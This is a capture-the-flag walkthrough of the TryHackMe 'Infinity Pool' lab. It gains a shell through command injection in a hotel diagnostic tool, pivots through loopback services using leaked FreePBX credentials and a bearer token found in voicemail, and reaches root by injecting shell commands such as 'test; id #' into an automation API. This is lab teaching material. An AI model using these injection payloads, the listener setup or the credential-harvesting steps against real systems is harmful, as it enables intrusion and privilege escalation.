# Infinity Pool TryHackMe walkthrough

---

During our **Day 11** of Hacker’s Holidays we’ll exploit a command injection vulnerability in a hotel’s staff diagnostic tool to get a shell, then escalate through leaked credentials and a hidden voicemail secret to gain root.

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/001.png)

## Part I

## Step 1: Recon

**Nmap** found two ports: 80 and 22


```bash
nmap 10.65.183.120
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/002.png)

Now run **gobuster**:


```bash
gobuster dir -u YOUR_IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_http.txt
```


As we can see, it found /status

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/003.png)

Let’s visit the /status in our browser:

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/004.png)

## **Step 2: Test for command injection**

Now we will try to inject shell metacharacters into the host field to chain additional commands.

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/005.png)

Confirmed!

Time to launch **a reverse shell.**

First, start a listener on your attack box:


```bash
nc -lvnp 4444
```


Then send a reverse shell payload as the host value.

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/006.png)

We got a shell. Get proper TTY:


```bash
script /dev/null -c bash
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/007.png)

Now we will browse for user.txt


```text
find / -type f -name "user.txt" 2>/dev/null
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/008.png)

The user flag is in /home/web

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/009.png)

## Part II

Run:


```text
ss -tulnp
```


to check every network port a program is listening on. From the output we can see that there’s a lot listening on loopback only — MySQL on 3306, and a handful of unfamiliar ports (8080, 8089, 8088, 3000, 9000) that aren’t reachable from outside, but we can hit them directly from this shell.

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/010.png)

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/011.png)

sudo -l is a dead end (no password cached), and there’s nothing juicy in SUID binaries or capabilities either.


```text
ps auxww
```


**ps auxww** is more interesting — the same gunicorn/wsgi:app setup we’re already running as PID 668 (web, cc-edge, port 80) is also running as PID 667 (root, cc-automation, port 9000) and PID 669 (svc-watch, cc-watchtower, port 3000). Three separate deployments of the same app pattern, three different privilege levels:

![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/012.png)

ps aux gives us the raw process paths, but not clean names — checking systemd confirms these are managed services and gives us the actual unit names


```bash
grep -rl "infinity_pool" /etc/systemd/system/
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/013.png)

Three systemd services. cc-edge is the app we already popped (runs as web). cc-automation runs as root but only listens on 127.0.0.1:9000. cc-watchtower runs as svc-watch, only on **127.0.0.1:3000**. Both are loopback-only, but we’re already on the box, so we can just curl them directly.

## **Step 4: Pivot through Watchtower**

Watchtower’s homepage says it’s “Authenticated by network position” — it trusts anything from localhost, no login needed. Checking its API:


```bash
curl -s http://127.0.0.1:3000/api/config
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/014.png)

A FreePBX UCP login sitting in plaintext, and an ops note admitting the account is still on default template creds!

## **Step 5: Log in to FreePBX UCP**

Before we can log in, we need two things from the login page: **a security token** (called a CSRF token) that the site expects us to send back, and a **cookie** to keep our session tied together across requests. The login itself doesn’t happen through a normal page load — it happens through a background request (AJAX) that the page’s JavaScript sends behind the scenes.

So the first step is just to **load the login page and save** what it gives us:


```bash
curl -sS -c /tmp/cookies.txt "http://127.0.0.1:8080/ucp/index.php?display=login" -o /tmp/login.html
```


Now we dig through that saved page to **pull out the token:**


```ini
TOKEN=$(grep -oP 'name="token" value="\K[^"]+' /tmp/login.html)
```


With the token and cookie in hand, we can **submit the actual login**:


```bash
curl -sS -b /tmp/cookies.txt -c /tmp/cookies.txt -d "token=${TOKEN}&username=FreePBXUCPTemplateCreator&password=St4yN0t1c3d_2026&module=User&command=login" http://127.0.0.1:8080/ucp/ajax.php
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/015.png)

- status**: true**
- token: **6e86e9c258985c766089851553a73fdd**

Logged in, as extension 9919988.

## **Step 6: Pull the automation key out of voicemail**

Now that we’re logged in, we can look around the dashboard like a normal user would. One of the things sitting there is a Voicemail inbox. To actually list the messages in it, we need to ask the server for them directly — and it turns out the server won’t hand over any messages unless we tell it how many to show and where to start from (that’s what **limit** and **offset** mean below). Without those, it just replies with an empty list.


```bash
curl -sS -b /tmp/cookies.txt "http://127.0.0.1:8080/ucp/ajax.php?module=voicemail&command=grid&folder=INBOX&ext=9919988&limit=10&offset=0"
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/016.png)

The one voicemail message has the automation service’s bearer token sitting right in the Caller ID field: **cc\_auto\_7b3f9a1c4e0d2f6a**

## **Step 7: Root via command injection in the automation API**

There’s a third service running on this box called **cc-automation**— and unlike the app we already broke into, this one runs as **root**. It's only reachable from inside the machine (not from the outside world), but since we're already inside, we can talk to it directly. The good news is this service actually tells us how to use it, if we just ask. Most APIs have a /health route:


```bash
curl -s http://127.0.0.1:9000/health
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/017.png)

The response tells us there’s a route called **/jobs/export** that expects a **report** name, and it needs a special key ("Bearer token") to be allowed to use it — which we happen to already have, from the voicemail message we found earlier (**cc\_auto\_7b3f9a1c4e0d2f6a)**


```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" -H "Content-Type: application/json" -d '{"report":"test; id #"}'
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/018.png)

Root. Same trick to grab the flag:


```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export -H 
"Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a"
 -H 
"Content-Type: application/json"
 -d 
'{"report":"test; cat /root/root.txt > /tmp/root_flag.txt #"}'
cat
 /tmp/root_flag.txt
```


![Infinity Pool TryHackMe walkthrough screenshot](../../assets/infinity-pool-tryhackme-walkthrough/019.png)

Missed the previous challenges? You can find the solutions for [**Day 1**](day-01-the-concierge-knows-too-much-tryhackme-walkthrough.md) , [**Day 2**](day-02-room-404-tryhackme-walkthrough.md), [**Day 3**](day-03-complimentary-tryhackme-walkthrough.md), [**Day 4**](day-04-packed-light-tryhackme-walkthrough.md), [**Day 5**](day-05-beach-bar-tryhackme-walkthrough.md)**,** [**Day 6**](day-06-overheard-at-breakfast-tryhackme-walkthrough.md), [**Day 7**](day-07-do-not-disturb-tryhackme-walkthrough.md), [**Day 8**](day-08-towel-on-the-sunbed-tryhackme-walkthrough.md), [**Day 9**](day-09-cryptocabana-tryhackme-walkthrough.md) **and** [**Day 10**](day-10-the-hollow-shell-tryhackme-walkthrough.md)**.**

